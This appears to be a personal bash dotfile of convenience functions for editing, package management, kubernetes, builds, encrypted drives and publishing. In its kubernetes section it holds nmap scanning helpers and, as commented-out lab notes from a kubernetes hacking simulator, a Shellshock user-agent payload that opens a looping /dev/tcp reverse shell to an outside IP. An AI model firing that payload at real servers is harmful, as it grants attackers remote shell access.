#!/bin/bash

# -----------------------------------------------------------------------------
# opening helpers

# shellcheck disable=SC2230
vim() { # ^ avoids recursion
  if [ $# -eq 0 ]; then
    $(which vim) "$(fzf)"
  else
    $(which vim) "$@"
  fi
}

# shellcheck disable=SC2230
v() {
  if [ $# -eq 0 ]; then
    $(which vlc) "$(fzf)" > /dev/null 2>&1
  else
    $(which vlc) "$1" > /dev/null 2>&1
  fi
}

s() {
  if [ $# -eq 0 ]; then
    subl3 "$(fzf)"
  else
    subl3 "$@"
  fi
}

cbr() {
  # shellcheck disable=SC2068
  cargo build --release $@
}
cbrm() {
  # shellcheck disable=SC2068
  cargo build --release --target=x86_64-unknown-linux-musl $@
}

cs() {
  # shellcheck disable=SC2068
  cowsay -f flaming-sheep $@ | lolcat -S 60;
}

# git diff : but filtering out moved lines
# not super necessary anymore since diff coloring of moved lines is a thing
diffminuslines() {
  diff_lines="$(git diff | grep -v '^\(---\|+++\|@@ \)'| grep '^\([><] \)\|[+-]' | sed 's/^+/> /;s/^-/< /')"
  while IFS= read -r line || [ -n "$line" ]; do
    contents="${line:2}"
    is_removed="$(grep -cFxe "< $contents" <<< "$diff_lines" || true)"
    is_added="$(grep -cFxe "> $contents" <<< "$diff_lines" || true)"
    if [[ "$is_removed" -ne "$is_added" ]]; then
      echo "$line"
    fi
  done <<< "$diff_lines"
}

# chrome history
ch() {
  local cols sep
  cols=$(( COLUMNS / 3 ))
  sep='{::}'

  if hash google-chrome-stable 2> /dev/null; then
    cp -f ~/.config/google-chrome/Default/History /tmp/h
  else
    cp -f ~/.config/chromium/Default/History /tmp/h
  fi

  sqlite3 -separator $sep /tmp/h \
      "select substr(title, 1, $cols), url
      from urls order by last_visit_time desc" |
    awk -F $sep '{printf "%-'$cols's  \x1b[36m%s\x1b[m\n", $1, $2}' |
    fzf --ansi --multi | sed 's#.*\(https*://\)#\1#' | \
    xargs xdg-open > /dev/null
}

openimage() {
  local types='*.jpg *.JPG *.png *.PNG *.gif *.GIF *.jpeg *.JPEG'

  cd "$(dirname "$1")" || true
  local -r file=$(basename "$1")

  # shellcheck disable=SC2086
  feh -q $types --auto-zoom \
    --sort filename --borderless \
    --scale-down --draw-filename \
    --image-bg black \
    --start-at "$file"
}

dslrdump() {
  cd /media/gauss/IMG/ || return
  mkd "$(date +%F)"
  gphoto2 --get-all-files
  #gphoto2 --delete-all-files doesn't work :( - pantheon-photos works though
}

# veracrypt shortcuts
vc1() {
  sudo echo "got sudo" # cache sudo first
  # For some reason the below cmd does not work without non-interactive in text mode
  veracrypt -t --mount /dev/sdc1 --slot=1 --verbose -p "$(pass drives/turing)" --non-interactive
  export HISTFILE=/dev/null
  cd /media/veracrypt1 || false
}
vc2() {
  sudo echo "got sudo" # cache sudo first
  # For some reason the below cmd does not work without non-interactive in text mode
  veracrypt -t --mount /dev/sde1 --slot=2 --verbose -p "$(pass drives/hilbert)" --non-interactive
  export HISTFILE=/dev/null
  cd /media/veracrypt2 || false
}
vcc() {
  cd || true
  veracrypt --text --dismount /dev/sdc1 --dismount /dev/sde1
  exit
}

wifihotspot() {
  sudo create_ap wlp2s0 enp0s20f0u1 "Bathroom Cam 2" "$(pass network/ea-laptop)"
}

# -----------------------------------------------------------------------------
# package manager abstraction - mostly for my own memory

if grep -q "Arch Linux" /etc/os-release; then
  # list available packages:
  paks() { pacman -Ss "$1" ;}
  # list locally installed packages:
  pakl() { pacman -Qs "$1" ;}
  # what package owns local file:
  pakf() { pacman -Qo "$1" ;}
  # what package owns a file you don't have:
  pakq() { pacman -Fs "$1"; } # may need a pacman -Fy first
  # list files belonging to a package:
  qlist() { pacman -Ql "$1" ;}
  # install a package:
  paki() { sudo pacman -S "$1" ;}
  # remove a package and its dependencies recursively:
  pakr() { sudo pacman -Rs "$1" ;}
  # list available updates to installed packages:
  #canonical checkupdates
elif grep -qE "Ubuntu|Mint" /etc/os-release; then
  paks() { apt-cache search "$1"; }
  # the easier ones for this all perform network queries..
  pakl() { dpkg --get-selections | grep -v deinstall | awk '{ printf("%s\n", $1) }' | grep "$1" ;}
  pakf() { dpkg -S "$1" ;}
  pakq() { apt-file search "$1" ;} # needs apt-file installed + `apt-file update` called
  qlist() { dpkg-query -L "$1" ;}
  paki() { sudo apt-get install "$1" ;}
  pakr() { sudo apt-get remove "$1" ;}
elif lsb_release -ds | grep -qEi "Gentoo"; then
  paks() { eix -c "$1" ;}
  pakf() { equery belongs "$1" ;}
  # canonical qlist
  paki() { sudo emerge "$1" ;}
  pakr() { sudo emerge -cav "$1" ;}
  checkupdates() { eix -uc "$1" ;}
elif hash yum 2> /dev/null; then
  paks() { yum search "$1" ;}
  pakf() { yum whatprovides "$1" ;}
  qlist() { repoquery --list "$1" ;} # from yum-utils
  paki() { sudo yum install "$1" ;}
  pakr() { sudo yum remove "$1" ;}
elif grep -qE "Alpine Linux" /etc/os-release; then
  paks() { apk info -vv | grep "$1" ;}
  pakl() { apk search  "$1" ;} # needs an apk update first
  pakf() { apk info --who-owns "$1" ;}
  #pakq() {} # needs apk-file installed - go get github.com/jessfraz/apk-file outside
  qlist() { apk info -L "$1" ;}
  paki() { apk add --no-cache "$1" ;}
  pakr() { apk del "$1" ;}
fi

# -----------------------------------------------------------------------------
# systemd - general interface can use sysz
# but have some things that here for quick convenience

sysfollow() {
  local -r unit="$1"
  journalctl -u "$unit" -fl | ccze
}
_syslistunits() {
  local cur
  _init_completion || return
  local -r units="$(systemctl list-units --no-pager --no-legend | awk '{ print $1 }')"
  # shellcheck disable=SC2207
  COMPREPLY=($(compgen -W "$units" -- "$cur"))
}
complete -F _syslistunits sysfollow

sysreload() {
  local -r unit="$1"
  sudo systemctl daemon-reload
  sudo systemctl restart "$unit"
}
complete -F _syslistunits sysreload

# -----------------------------------------------------------------------------
# kubernetes

# context switcher
kc() {
  local -r ctx="$1"
  if [[ $ctx ]]; then
    kubectl config use-context "$ctx"
  else
    kubectl config get-contexts | sort -d
  fi
}
_kc() {
  local cur
  _init_completion || return
  local -r ctxs="$(kubectl config get-contexts -o name)"
  # shellcheck disable=SC2207
  COMPREPLY=($(compgen -W "$ctxs" -- "$cur"))
}
complete -F _kc kc

# cluster version checker
kcver() {
  for ctx in $(kc | grep -v "\*" | awk '{print $1}' | tail -n +2); do
    kc "${ctx}" > /dev/null;
    echo "${ctx}$(kubectl version --short | grep Server | grep -oE " v.*")";
  done
}

k3dmake() {
  k3d cluster create --servers 1 --agents 1 main \
    --k3s-agent-arg '--kubelet-arg=eviction-hard=imagefs.available<1%,nodefs.available<1%' \
    --k3s-agent-arg '--kubelet-arg=eviction-minimum-reclaim=imagefs.available=1%,nodefs.available=1%'
  k3d kubeconfig get --all > ~/.kube/k3d
}

nmap-kube () {
    nmap --open -T4 -A -v -Pn -p 443,2379,4194,6782-6784,6443,8443,8080,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
    local -r LOCAL_RANGE="$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,')"
    local SERVER_RANGES=" ";
    SERVER_RANGES+="10.0.0.1 ";
    SERVER_RANGES+="10.0.1.* ";
    SERVER_RANGES+="10.*.0-1.* ";
    nmap-kube "${SERVER_RANGES}" "${LOCAL_RANGE}"
}

# stuff via bulletproof kubernetes hacking
# https://www.youtube.com/watch?v=NEfwUxId1Uk
# https://github.com/kubernetes-simulator/simulator
#while :; do ssh controlplane ncat --listen 1234 --output $(mktemp /tmp/hack-XXXX.log); done

# shellshock as a service https://github.com/hmlio/vaas-cve-2014-6271
# continuous dev/tcp hackery via shellshock:
#while :; do curl http://165.22.113.204:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "while :; do nohup bash -i >& /dev/tcp/149.202.164.115/1234 0>&1; sleep 1; done"'; done

# -----------------------------------------------------------------------------
# git

glscommand() {
  local -r dirs=$(find . -maxdepth 1 -mindepth 1 -type "d")
  local -r command="$1"
  dir=$PWD
  for d in $dirs; do
    cd "$d" || false
    echo -en "$(tput setaf 33)${d:2} "
    if [[ -d .git ]]; then
      echo -en "$(tput setaf 136)$(${command})$(tput sgr0)"
    fi
    echo
    cd ..
  done
  cd "$dir" || true
}

# ls | git prompt
gls() { glscommand "show_git_differences" ;}
# ls | git whoami
glsd() { glscommand "git whoami" ;}

# -----------------------------------------------------------------------------
# misc

# browse non-generated / build files in a simple unix tree
t() {
  tree -aC -I "node_modules|target|site-packages|.git|bower_components|venv" --dirsfirst "$@" | less -FRX
}

# guake helpers to rename the tab we don something
zz() {
  guake --rename-tab="${PWD##*/}" -i "$(guake -g)"
}
zzh() {
  guake --rename-tab="$1" -i "$(guake -g)"
  # shellcheck disable=SC2068
  ssh $@
}

# Create a new directory and enter it
mkd() { mkdir -p "$@" && cd "$@" || return 1 ;}

kill-tabs() { pkill -u "$USER" -f "chrome.*renderer" ;}
# NB: renderer tabs are not 1-1 with tabs :/

# override monitor refresh rate
# super meat boy: refresh-rate 60
# everything else: refresh-rate 144
refresh-rate() {
  local -r rate="${1-144}"
  if [[ ${HOSTNAME} = kjttks ]]; then
    # Main screen refresh rate
    xrandr --output HDMI-0 --mode 1920x1080 --rate "$rate"
    xrandr -q | grep -E "$rate\.00\*"
  fi
}

docker-clean() {
  docker ps -aq | xargs -r docker rm -f
  docker images -q -f="dangling=true" | xargs -r docker rmi -f
}

musl-cross() {
  cross build --target x86_64-unknown-linux-musl --release --verbose
}
musl-build() {
  docker run \
    -v cargo-cache:/root/.cargo \
    -v "$PWD:/volume" -w /volume \
    --rm -it clux/muslrust cargo build --release
}

serve() {
  python -m http.server 8000
}

# upload a single file in PWD to transfer.sh
transfer() {
  curl --upload-file "$1" "https://transfer.sh/$1" | xclip -sel clip
}
ruby-env() {
  local -r gemdir="$(ruby -e 'print Gem.user_dir')"
  export PATH="${gemdir}/bin:$PATH"
}

banish-daemons() {
  sudo systemctl stop docker
  sudo systemctl stop postgresql
  pm2 kill
}

steam-tf2() {
  export __GL_SYNC_TO_VBLANK=0
  export __GLVND_DISALLOW_PATCHING=1 # helped tf2 in the past
  steam
}

steam-mesa-old() {
  # A helper wrapper that made an older mesa laptop work better
  # shellcheck disable=SC2016
  LD_PRELOAD='/usr/$LIB/libstdc++.so.6 /usr/$LIB/libgcc_s.so.1 /usr/$LIB/libxcb.so.1 /usr/$LIB/libgpg-error.so' steam
}

q3() {
  set -x
  # Get most of quake3 from https://aur.archlinux.org/quake3-cpma.git (not pak0.pk3)
  export __GL_SYNC_TO_VBLANK=0
  # Need alsa-oss package and need to enable oss kernel modules
  sudo modprobe snd_seq_oss
  sudo modprobe snd_pcm_oss
  sudo modprobe snd_mixer_oss
  # Find correct card by looking in /proc/asound/cards
  # Mine jumps around, but its identifier is STX (Asus Xonar STX) - map to number:
  local -r cardid=$(grep STX /proc/asound/cards | awk '{print $1}')
  # Give DMA Access
  # NB: If you screw with this badly and it doesn't work, boot.
  echo "quake3.x86 0 0 direct" | sudo tee "/proc/asound/card${cardid}/pcm0p/oss"
  echo "quake3.x86 0 0 disable" | sudo tee "/proc/asound/card${cardid}/pcm0c/oss"
  # Have "seta snddevice /dev/dsp${cardid}" in your q3config.cfg
  # Or use this start command twice (for some reason it doesn't take first start)
  aoss quake3-cpma +"seta snddevice /dev/dsp${cardid}"
  # Do not open chrome and start playing music in the background
  # First sound you hear after boot should be quake
}


hr() {
  local -r COLS=$(tput cols)
  local -r SEP="*"
  local HR=''
  while (( ${#HR} < COLS )); do
      HR="$HR$SEP"
  done
  echo "$(tput setaf 33)${HR:0:$COLS}$(tput sgr0)"
}

# -----------------------------------------------------------------------------
# system statistics/usage

mem() {
  free -t | grep Mem | awk '{ printf("%3.1f%%\n", $3*100/$2)}'
}
disk() {
  # Total usage of currently mounted logical drives
  df -l --total \
    | grep total \
    | awk '{printf("%3.1f%%\n", $3*100/$2)}'
}
cpu() { awk '{printf("%3.1f%%\n", $1*100/'"$(nproc)"') }' < /proc/loadavg ;}
# average cpu frequency based on current mean info across cores /proc/cpuinfo divided by max
cpufreq() {
  local -r maxkhz="$(cat /sys/devices/system/cpu/cpu1/cpufreq/scaling_max_freq)"
  local -r current_mhz="$(grep 'cpu MHz' /proc/cpuinfo | awk '{print $4}' | datamash mean 1)"
  echo "scale=2; 100* $current_mhz * 1000 / $maxkhz" | bc -l | xargs printf "%s%%\n"
}

iface() {
  # first interface with state UP
  ip link show | grep "state UP" | awk '{print $2}' | cut -d':' -f1 | head -n 1
}
network() {
  # transferred numbers are in first column, print everything with space separation
  local -r netdata=$(ip -s link show "$(iface)" | awk -v ORS=" " '{ print $1 }')
  # convert relevant numbers to gigabytes
  local -r RX=$(echo "$netdata" | cut -d" " -f4 | awk '{printf("%3.1fGB\n", $1/1073741824)}')
  local -r TX=$(echo "$netdata" | cut -d" " -f6 | awk '{printf("%3.1fGB\n", $1/1073741824)}')
  echo -e "Sent: ${TX}\nRecv: ${RX}"
}

localip() {
  ip addr show "$(iface)" | grep inet | awk '{ print $2 }'
}

# legacy
pstree() { echo "use procs"; }

# -----------------------------------------------------------------------------
# http helpers

# http method url ['{json}']
http() {
  local -r method="${1^^}"
  if [[ $method =~ POST|PUT ]]; then
    jsondata=$(echo "-H Content-Type:application-json -d \"$3\"")
  fi
  echo curl -X "$method $2 ${jsondata}"
}

# -----------------------------------------------------------------------------
# scaffolding from templates folder

node-init() {
  find ~/.templates/npm/ -not -type "d" -exec cp {} "$PWD" \;
  pkginit
  local -r dir="$(basename "$PWD")"
  echo "# $dir" > README.md
  badgify >> README.md
  sed "s/BASENAME/$dir/g" readme.md >> README.md
  rm readme.md
}

# -----------------------------------------------------------------------------
# misc node/py

node-deopts() {
  # shellcheck disable=SC2068
  node --trace_opt --trace_deopt --allow-natives-syntax $@
}

node-deps() {
  npm ls | grep -oE "[[:alnum:]\@\.]*" | sort -u
}

venv() {
  if [ -d venv ]; then
    source venv/bin/activate
  elif [ -d .venv ]; then
    source .venv/bin/activate
  else
    python3 -m venv venv
    source venv/bin/activate
    pip install -r requirements.txt
  fi
}

# -----------------------------------------------------------------------------
# documentation generation for gh-pages

# Do this AFTER bumping version in Cargo.toml and cargo package && cargo publish
rust-doc-update() {
  cargo doc
  local -r repo=$(basename "$PWD")
  echo "<meta http-equiv=refresh content=0;url=$repo/index.html>" > target/doc/index.html
  ghp-import -n target/doc
  git push -qf "git@github.com:clux/$repo.git" gh-pages
}

rust-doc-view() {
  cargo doc
  local -r repo=$(basename "$PWD")
  xdg-open "target/doc/$repo/index.html"
}

# -----------------------------------------------------------------------------
# more rust

rust-muslbuild() {
  docker run -v "$PWD:/volume" -w /volume -t clux/muslrust cargo build --release
  sudo chown "$USER" -R target
}

rust-fund() {
  cargo fund --github-api-token="$(pass github/cargo-fund-pat)"
}

# -----------------------------------------------------------------------------
# extraction shortcuts

# insert xkcd tar joke here
extract () {
  if [ -f "$1" ] ; then
      case "$1" in
          *.tar.bz2)   tar xvjf "$1"    ;;
          *.tar.gz)    tar xvzf "$1"    ;;
          *.tar.xz)    tar xvJf "$1"    ;;
          *.bz2)       bunzip2 "$1"     ;;
          *.rar)       unrar x "$1"     ;;
          *.gz)        gunzip "$1"      ;;
          *.tar)       tar xvf "$1"     ;;
          *.tbz2)      tar xvjf "$1"    ;;
          *.tgz)       tar xvzf "$1"    ;;
          *.zip)       unzip "$1"       ;;
          *.Z)         uncompress "$1"  ;;
          *.7z)        7z x "$1"        ;;
          *)           echo "unknown extension for '$1'" ;;
      esac
  else
      echo "$1 is not a valid file!"
  fi
}
# ball: output [inputs]
ball () { tar czf "$1.tar" "${@:2}" ;}
# 7zsplit output [inputs]
7zsplit() { 7z a "$1.7z" -mx0 -V500M "${@:2}" ;}

# -----------------------------------------------------------------------------
# Broxy + brotorr integrations

dl() { cd "$DOWNLOAD_DIR" || return 1 ;}

movies-diff () {
  diff -u <(ls /media/clux/TOOL/MP4/Movies/) <(ls /media/clux/Zorn/NewMP4/BluRay/)
}

# xdg-mime handler
broxy-download () {
  # shellcheck disable=SC2029
  ssh broxy "source ~/.path; source ~/.exports; ./brotorr/torrent \"$1\""
}

# Find flags for helpers
broxy-findflags() {
  echo -e "-not -name '.*' -not -regex '.*Trash.*' -not -name tmp -printf '%p\n'"
}
broxy-dirflags() { echo -e "-mindepth $1 -maxdepth $1 -type d" ;}

# Everything in DL - usually fetch from here
broxy-check() {
  # shellcheck disable=SC2029
  ssh broxy "cd dumptruck/DL && find . $(broxy-dirflags 1) $(broxy-findflags)"
}

# Everything
broxy-all() {
  # shellcheck disable=SC2029
  ssh broxy "cd dumptruck && find . $(broxy-dirflags 2) $(broxy-findflags)"
}

# Everything from last month
broxy-latest() {
  # shellcheck disable=SC2029
  ssh broxy "cd dumptruck && find . $(broxy-dirflags 2) -mtime -31 $(broxy-findflags)"
}

# Grab from broxy with a pattern with confirmation
broxy-grab() {
  local -r rs=$(broxy-all | grep "$1")
  echo "Will download:"
  echo "$rs"
  read -rp "Enter to continue.."
  echo "Starting download"
  echo "$rs" | while read -r line; do
    fldr=$(echo "$line" | cut -d '/' -f2-)
    echo "Downloading $fldr"
    rsync -cahzP -e ssh "broxy:/home/bro/dumptruck/$fldr" .
  done
  notify-send "completed download of $1"
}

# -----------------------------------------------------------------------------
# Publishing helpers

npm-patch() {
  npm version patch && git push && git push --tags && npm publish
}
npm-minor() {
  npm version minor && git push && git push --tags && npm publish
}
npm-major() {
  npm version major && git push && git push --tags && npm publish
}

cargo-tag() {
  git diff --exit-code || return 1
  git diff --cached --exit-code || return 1
  local -r ver="$(grep version Cargo.toml | awk -F"\"" '{print $2}' | head -n 1)"
  git tag -a "${ver}" -m "${ver}"
  git push
  git push --tags
  cargo publish
}
